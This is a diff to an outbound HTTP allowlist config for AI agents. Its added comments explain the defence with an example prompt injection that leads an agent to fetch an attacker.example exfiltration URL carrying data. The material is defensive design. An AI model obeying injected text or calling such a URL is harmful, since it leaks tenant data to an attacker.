@@ -1,9 +1,14 @@
 # Per-tenant outbound HTTP allowlist.
 
-# Hostnames can be exact (e.g. `api.stripe.com`) or wildcards (e.g.
-# `*.acme.internal`). An agent attempting to reach any other host gets a
-# policy error — this is the primary defence against exfiltration via
-# prompt injection.
+# Even if an agent has legitimate access to an http.fetch tool, we do not want it calling arbitrary URLs.
+
+# A successful prompt injection that convinces the agent to fetch https://attacker.example/exfil?data=... is a data leak.
+
+# The solution is per - tenant allowlist.
+
+# Hostnames can be exact (e.g. `api.stripe.com`) or wildcards (e.g. `*.acme.internal`). 
+# An agent attempting to reach any other host gets a policy error
+# This is the primary defence against exfiltration via prompt injection.
 
 "*":
   # Hosts that every tenant can hit.
